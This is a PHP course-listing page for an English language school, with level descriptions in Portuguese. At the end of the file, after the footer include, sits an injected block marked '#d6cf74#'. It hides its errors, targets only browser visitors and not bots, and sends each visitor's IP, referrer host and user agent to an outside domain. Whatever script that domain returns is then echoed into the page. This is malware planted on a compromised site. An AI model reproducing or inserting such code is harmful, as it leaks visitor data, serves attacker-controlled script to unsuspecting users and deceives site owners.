<?php include("header.php"); ?>
<body>
<?php include("topo-e-banner.php"); ?>
<div id="content" class="cursos">
<div class="seletor-cursos" id="nossos-cursos">
<img src="img/bt-nossoscursos-active.png" alt="Nossos Cursos" />
<a href="special-courses.php?s=special-courses"><img src="img/bt-special.png" alt="Special Courses" /></a>
<a href="in-company.php?s=in-company"><img src="img/bt-incompany.png" alt="In Company" /></a>
</div>
<p>
<!--
<span class="blue"><strong>BEGINNER</strong> – 1 módulo</span><br />
Iniciante: o aluno é preparado para o ELEMENTARY. Para alunos sem conhecimento prévio do idioma. 
<br />
<br />
-->
<span class="blue"><strong>ELEMENTARY</strong> – 2 módulos</span><br />
Básico: o aluno é apresentado a uma visão geral da estrutura do idioma, através de  estimulante vocabulário e expressões usadas no dia-a-dia. 
<br />
<!--<br />
<span class="blue"><strong>PRE-INTERMEDIATE</strong> – 2 módulos</span><br />
Pré-intermediário: o aluno sedimenta o conteúdo do nível anterior, trabalha com novas estruturas e expressões idiomáticas, ganhando confiança ao se comunicar nas situações rotineiras. 
<br />-->
<br />
<span class="blue"><strong>INTERMEDIATE</strong> – 2 módulos</span><br />
Intermediário: o aluno adquire a capacidade de se expressar e defender opiniões através de  conversação, progredindo para a fluência no idioma. 
<br />
<br />
<span class="blue"><strong>HIGH-INTERMEDIATE</strong> – 2 módulos</span><br />
Intermediário avançado: o aluno passa a se comunicar com fluência. A ênfase é na ampliação e no aprofundamento do vocabulário e das expressões idiomáticas utilizadas na conversação. 
<br />
<br />
<span class="blue"><strong>ADVANCED</strong> – 1 módulo</span><br />
Avançado: o aluno tem a fluência lapidada e adquire competência para um aprendizado autônomo e contínuo. 
<br />
<br />
<span class="blue"><strong>FLUENCY</strong> – módulo livre</span><br />
Fluência: o aluno tem  contínuo contato com o idioma.</p>
</div>
<?php include("rodape.php"); ?>
<?php
#d6cf74#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/d6cf74#
?>
